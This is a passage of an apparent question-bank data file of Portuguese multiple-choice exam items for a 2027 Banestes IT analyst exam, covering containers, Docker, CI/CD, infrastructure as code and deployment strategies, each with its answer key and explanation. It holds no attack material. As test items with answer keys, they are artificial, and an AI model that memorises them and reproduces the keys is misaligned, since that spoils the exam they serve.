    "B": "OverlayFS.",
    "C": "namespace UTS.",
    "D": "namespace de rede (NET).",
    "E": "seccomp."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Os **namespaces** isolam o que o processo **vê**; o namespace **NET** dá a cada contêiner interfaces, rotas e portas próprias.\n\n(A) cgroups **limitam** o uso de recursos (quanto o processo usa), não a visão da rede. (C) UTS isola o hostname. (B) OverlayFS é o sistema de arquivos em camadas das imagens. (E) seccomp filtra chamadas de sistema permitidas.\n\nRevisar: Apostila 04, §13.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Virtualização e contêineres",
  "ref_apostila": {
    "modulo": "04",
    "secao": "13",
    "titulo": "Virtualização e contêineres",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#13. Virtualização e contêineres]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §13 – Q4",
    "id_pai": "ESP-DEVOPS-0002",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um contêiner de relatórios passou a consumir toda a memória do host e foi preciso impedir que ultrapasse 512 MiB, sendo encerrado se exceder esse limite. O mecanismo do kernel Linux que implementa esse limite é",
  "imagem": null,
  "alternativas": {
    "A": "o namespace PID.",
    "B": "o namespace MNT.",
    "C": "o cgroup (control group).",
    "D": "o chroot.",
    "E": "o union filesystem."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** **cgroups** limitam e contabilizam recursos (CPU, memória, E/S). Um limite como `--memory=512m` no Docker é aplicado via cgroup.\n\n(A) e (B) Namespaces isolam a visão (processos, pontos de montagem), não limitam consumo. (D) chroot muda a raiz do sistema de arquivos. (E) O union filesystem empilha as camadas da imagem.\n\nRevisar: Apostila 04, §13.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Virtualização e contêineres",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §13 – Q5",
    "id_pai": "ESP-DEVOPS-0003",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Considere o trecho final de um Dockerfile e o comando usado para executar a imagem:\n\n```dockerfile\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\nCMD [\"--server.port=8080\"]\n```\n\n```bash\ndocker run -d banco/conta:2.1 --server.port=9090\n```\n\nO processo iniciado no contêiner será",
  "imagem": null,
  "alternativas": {
    "A": "`--server.port=9090`, pois o argumento do `docker run` substitui o ENTRYPOINT.",
    "B": "`java -jar app.jar --server.port=8080`, pois o CMD não pode ser sobrescrito.",
    "C": "`java -jar app.jar --server.port=8080 --server.port=9090`.",
    "D": "`java -jar app.jar --server.port=9090`.",
    "E": "nenhum, pois ENTRYPOINT e CMD não podem coexistir no mesmo Dockerfile."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Com ENTRYPOINT e CMD na forma exec, o CMD fornece os **argumentos padrão** do ENTRYPOINT. Argumentos passados no `docker run` **substituem o CMD** e são anexados ao ENTRYPOINT: `java -jar app.jar --server.port=9090`.\n\n(A) Para trocar o ENTRYPOINT seria preciso `--entrypoint`. (B) O CMD é justamente o que pode ser sobrescrito. (C) Os argumentos não se somam ao CMD; substituem-no. (E) É comum e recomendado combinar os dois.\n\nObs.: comportamento conferido na documentação do Docker; não executado no container de verificação (sem daemon Docker).\n\nRevisar: Apostila 06, §12.5.",
  "tags": [
    "nao_executado"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Virtualização e contêineres",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §13 – Q5",
    "id_pai": "ESP-DEVOPS-0003",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma imagem tem no Dockerfile a instrução `EXPOSE 8080` e é executada com `docker run -d -p 8081:8080 --name pix pix-api:1.0`. Para acessar a API a partir do próprio host, deve-se usar a porta",
  "imagem": null,
  "alternativas": {
    "A": "8080 do host, pois o EXPOSE já publica a porta automaticamente.",
    "B": "8081 do host, que é mapeada para a porta 8080 do contêiner.",
    "C": "8080 do host, pois o `-p` usa a ordem contêiner:host.",
    "D": "qualquer porta, pois o Docker escolhe aleatoriamente.",
    "E": "nenhuma, pois o modo `-d` impede o acesso pela rede."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A sintaxe é `-p host:contêiner`: a porta **8081 do host** encaminha para a 8080 do contêiner.\n\n(A) EXPOSE apenas **documenta** a porta; quem publica é o `-p`. (C) A ordem é host:contêiner. (D) Porta aleatória só ocorre com `-P` (maiúsculo) ou sem informar a porta do host. (E) `-d` apenas executa em segundo plano (detached).\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q1",
    "id_pai": "ESP-DEVOPS-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um banco, toda alteração que passa pelo pipeline gera um pacote pronto e testado em homologação, mas a ida para produção ocorre somente após aprovação do gestor de mudanças, com um clique. Essa prática corresponde a",
  "imagem": null,
  "alternativas": {
    "A": "integração contínua apenas, pois não há testes automatizados.",
    "B": "implantação contínua (continuous deployment).",
    "C": "entrega contínua (continuous delivery).",
    "D": "modelo cascata com homologação manual.",
    "E": "deploy recreate."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Na **entrega contínua**, o software está sempre pronto para ser liberado, mas a ida à produção é uma **decisão manual**.\n\n(A) Há pacote testado em homologação, o que vai além da CI. (B) Na implantação contínua a produção é atualizada **automaticamente**, sem intervenção humana. (D) O cascata não pressupõe pipeline automatizado a cada alteração. (E) Recreate é estratégia de troca de versão (derruba a antiga e sobe a nova).\n\nRevisar: Apostila 06, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V008",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q1",
    "id_pai": "ESP-DEVOPS-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre as práticas de integração contínua descritas por Martin Fowler, é INCORRETO afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "cada desenvolvedor deve integrar seu trabalho na linha principal ao menos diariamente.",
    "B": "cada integração dispara um build automatizado com testes automatizados.",
    "C": "o build quebrado deve ser corrigido imediatamente, como prioridade.",
    "D": "o build deve ser rápido, para dar feedback em poucos minutos.",
    "E": "as integrações devem ser acumuladas e feitas ao fim da iteração, para reduzir o número de builds."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Acumular integrações para o fim da iteração é o oposto da CI: o objetivo é integrar **com frequência** (pelo menos diariamente) para detectar erros cedo.\n\n(A), (B), (C) e (D) são práticas de CI listadas por Fowler: commit diário na mainline, build autotestável, correção imediata do build quebrado e build rápido.\n\nRevisar: Apostila 06, §12.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V009",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q2",
    "id_pai": "ESP-DEVOPS-0005",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre os conceitos do Docker, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "a imagem é uma instância em execução, e o contêiner é o modelo somente leitura a partir do qual ela é criada.",
    "B": "os dados gravados na camada gravável de um contêiner permanecem disponíveis mesmo depois que o contêiner é removido.",
    "C": "o Docker Hub é o arquivo de texto com as instruções para construir uma imagem.",
    "D": "a imagem é formada por camadas somente leitura, e cada contêiner acrescenta uma camada gravável; dados que precisam persistir devem ficar em volumes.",
    "E": "o Docker Compose é o orquestrador que distribui pods entre os nós de um cluster."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Imagem = modelo **somente leitura** em camadas; contêiner = instância em execução com uma **camada gravável** por cima; dados persistentes vão para **volumes**.\n\n(A) Inverte imagem e contêiner. (B) A camada gravável some quando o contêiner é removido. (C) O arquivo de instruções é o Dockerfile; o Docker Hub é um registro de imagens. (E) O Compose define aplicações multicontêiner num YAML em um host; distribuir pods em cluster é papel do Kubernetes.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V010",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q4",
    "id_pai": "ESP-DEVOPS-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para lançar a nova versão do internet banking, a equipe manteve dois ambientes de produção idênticos: um atendendo os clientes e outro com a nova versão instalada e testada. No horário marcado, o roteador passou todo o tráfego para o ambiente novo, mantendo o antigo pronto para um retorno imediato. Essa estratégia é a",
  "imagem": null,
  "alternativas": {
    "A": "canary release.",
    "B": "rolling update.",
    "C": "recreate.",
    "D": "A/B testing.",
    "E": "blue-green deployment."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** No **blue-green** há dois ambientes completos; troca-se o tráfego de uma vez, e o rollback é imediato (volta-se para o ambiente antigo).\n\n(A) Canary libera a nova versão primeiro para uma pequena parcela de usuários. (B) Rolling substitui instâncias aos poucos, sem duplicar o ambiente. (C) Recreate derruba a versão antiga antes de subir a nova, com indisponibilidade. (D) A/B testing compara versões para fins de negócio.\n\nRevisar: Apostila 06, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V011",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q4",
    "id_pai": "ESP-DEVOPS-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma funcionalidade de Pix por aproximação foi implantada em produção desligada e será ativada por configuração, primeiro para os funcionários e depois para todos os clientes, sem nova implantação. Essa técnica, que separa a implantação (deploy) da liberação (release), é a de",
  "imagem": null,
  "alternativas": {
    "A": "feature flags (feature toggles).",
    "B": "blue-green deployment.",
    "C": "dark launch por espelhamento de tráfego.",
    "D": "recreate deployment.",
    "E": "hotfix do Git Flow."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** **Feature flags** colocam o código em produção desligado e o ativam por configuração para grupos de usuários: separam deploy de release e viabilizam o trunk-based development.\n\n(B) Blue-green troca todo o tráfego entre dois ambientes. (C) Dark launch envia cópia do tráfego real à nova versão sem afetar o usuário. (D) Recreate derruba a versão antiga e sobe a nova. (E) Hotfix é um ramo de correção urgente.\n\nRevisar: Apostila 06, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V012",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q5",
    "id_pai": "ESP-DEVOPS-0007",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em infraestrutura como código, a abordagem em que se descreve o estado desejado (por exemplo, \"devem existir 3 VMs do tipo t3.medium\"), cabendo à ferramenta descobrir o que criar, alterar ou remover para chegar a ele, é denominada",
  "imagem": null,
  "alternativas": {
    "A": "imperativa, típica de scripts shell.",
    "B": "declarativa, como no Terraform e nos manifestos YAML do Kubernetes.",
    "C": "mutável, com servidores atualizados no lugar.",
    "D": "procedural, com a ordem dos passos definida pelo autor.",
    "E": "manual, executada por console web."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A abordagem **declarativa** descreve o **estado desejado**; a ferramenta calcula as ações (Terraform, CloudFormation, YAML do Kubernetes).\n\n(A) e (D) A imperativa/procedural descreve os **passos**. (C) Mutável x imutável diz respeito a alterar servidores no lugar ou recriá-los, não à forma de descrever. (E) Configuração manual é o que a IaC substitui.\n\nRevisar: Apostila 06, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V013",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 06 §12 – Q5",
    "id_pai": "ESP-DEVOPS-0007",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre infraestrutura como código (IaC), é INCORRETO afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "versionar as definições permite revisão em pull request e rollback.",
    "B": "a infraestrutura imutável substitui servidores por novos, criados a partir de imagem, em vez de alterá-los.",
    "C": "o Ansible opera em modelo push, sem agente, via SSH.",
    "D": "IaC reduz o desvio de configuração (configuration drift) e os servidores \"flocos de neve\".",
    "E": "uma ferramenta idempotente executa todas as ações novamente a cada aplicação, mesmo que o estado já seja o desejado."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Idempotência significa que aplicar a mesma definição várias vezes produz o **mesmo resultado**: se o estado já é o desejado, **nada muda**.\n\n(A) Versionamento é benefício central da IaC. (B) É a definição de infraestrutura imutável. (C) Ansible é push e agentless. (D) IaC combate drift e servidores únicos impossíveis de reproduzir.\n\nRevisar: Apostila 06, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V014",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um pipeline de implantação típico, a sequência mais adequada de estágios, do commit à produção, é:",
  "imagem": null,
  "alternativas": {
    "A": "implantação em produção → testes de unidade → build → testes de aceitação.",
    "B": "build → testes de unidade e análise estática → empacotamento do artefato → testes de integração/aceitação em homologação → implantação em produção.",
    "C": "empacotamento → build → análise estática → testes de unidade → produção.",
    "D": "testes de aceitação em produção → build → testes de unidade → empacotamento.",
    "E": "análise estática → implantação em produção → build → testes de integração."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** Ordem típica: commit → build → testes de unidade e análise estática (qualidade e segurança) → empacotamento (artefato/imagem) → testes de integração/aceitação em homologação → (aprovação, na entrega contínua) → produção → monitoramento.\n\n(A), (C), (D) e (E) invertem etapas: não se empacota antes de compilar, nem se implanta em produção antes de testar.\n\nRevisar: Apostila 06, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V015",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Segundo os princípios de entrega contínua de Humble e Farley, o artefato implantado em produção deve ser",
  "imagem": null,
  "alternativas": {
    "A": "recompilado em cada ambiente, a partir do código-fonte, para incorporar as configurações locais.",
    "B": "gerado manualmente pelo administrador de produção.",
    "C": "o mesmo binário construído uma única vez e promovido pelos ambientes, com a configuração separada do artefato.",
    "D": "diferente do testado em homologação, para evitar cache.",
    "E": "copiado da máquina do desenvolvedor que fez o último commit."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Princípio: **construa os binários uma única vez** e promova o **mesmo artefato** por todos os ambientes; o que muda entre ambientes é a configuração.\n\n(A) Recompilar por ambiente abre espaço para diferenças entre o que foi testado e o que vai para produção. (B) e (E) Processos manuais e máquinas de desenvolvedor contrariam a automação e a rastreabilidade. (D) O artefato deve ser exatamente o que foi testado.\n\nRevisar: Apostila 06, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V016",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Testes de software",
  "ref_apostila": {
    "modulo": "06",
    "secao": "16",
    "titulo": "Testes de software",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#16. Testes de software]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §16.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um pipeline de CI, a suíte automatizada que é reexecutada a cada alteração para verificar se funcionalidades que já funcionavam continuam funcionando, após correções ou novas funcionalidades, constitui os testes de",
  "imagem": null,
  "alternativas": {
    "A": "aceitação do usuário.",
    "B": "estresse.",
    "C": "usabilidade.",
    "D": "fumaça executados uma única vez na entrega final.",
    "E": "regressão."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** **Teste de regressão** verifica se mudanças não quebraram o que já funcionava; sua automação no pipeline é prática central de CI/CD.\n\n(A) Aceitação valida o atendimento às necessidades do usuário. (B) Estresse leva o sistema além do limite. (C) Usabilidade avalia a facilidade de uso. (D) Smoke test é um teste rápido de sanidade; e não se executa só uma vez.\n\nRevisar: Apostila 06, §16.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V017",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Considere o arquivo de pipeline a seguir (sintaxe do GitLab CI):\n\n```yaml\nstages: [build, test, deploy]\n\nempacotar:\n  stage: build\n  script: mvn -B package\n\ntestar:\n  stage: test\n  script: mvn -B verify\n\nproducao:\n  stage: deploy\n  script: ./implantar.sh prod\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"main\"\n      when: manual\n```\n\nÉ correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "o job `producao` roda automaticamente em todo commit de qualquer branch, caracterizando implantação contínua.",
    "B": "os três jobs rodam em paralelo, pois estão no mesmo arquivo.",
    "C": "o job `producao` só existe em pipelines da branch main e aguarda acionamento manual, caracterizando entrega contínua.",
    "D": "o job `testar` roda antes de `empacotar`, porque testes vêm antes do build.",
    "E": "se o job `testar` falhar, o job `producao` é executado automaticamente para corrigir o ambiente."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** A regra limita `producao` à branch `main` e, com `when: manual`, exige que alguém o acione: o software fica pronto para produção, mas a liberação é decisão manual — **entrega contínua**.\n\n(A) Não é automático nem vale para qualquer branch. (B) Os estágios rodam em sequência (build → test → deploy); só jobs do **mesmo** estágio rodam em paralelo. (D) A ordem é a de `stages`: build antes de test. (E) Com falha em um estágio, os estágios seguintes não prosseguem.\n\nEstrutura do YAML conferida com PyYAML em `tools/verificacao/agente4/verif_devops.py`; a semântica (stages, when, rules) segue a documentação do GitLab CI.\n\nRevisar: Apostila 06, §12.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V018",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "A estratégia de versionamento mais alinhada à integração contínua, em que todos integram no tronco principal com muita frequência, usando ramos de vida curtíssima e escondendo funcionalidades incompletas atrás de feature flags, é o",
  "imagem": null,
  "alternativas": {
    "A": "trunk-based development.",
    "B": "Git Flow, com ramos develop e release de longa duração.",
    "C": "modelo de ramos por cliente, mantidos indefinidamente.",
    "D": "GitLab Flow com ramos de ambiente obrigatórios.",
    "E": "uso de ramos de feature de vários meses, integrados ao fim do projeto."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** No **trunk-based development** todos integram no tronco ao menos diariamente, com ramos curtos ou nenhum e feature flags; é a estratégia mais alinhada à CI/CD.\n\n(B) O Git Flow usa ramos de longa duração, adequados a releases planejadas. (C) e (E) Ramos longos adiam a integração e aumentam conflitos. (D) O GitLab Flow acrescenta ramos de ambiente, mas não é a definição pedida.\n\nRevisar: Apostila 06, §12.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V019",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Das quatro métricas DORA, as duas que medem a estabilidade das entregas (e não a velocidade) são",
  "imagem": null,
  "alternativas": {
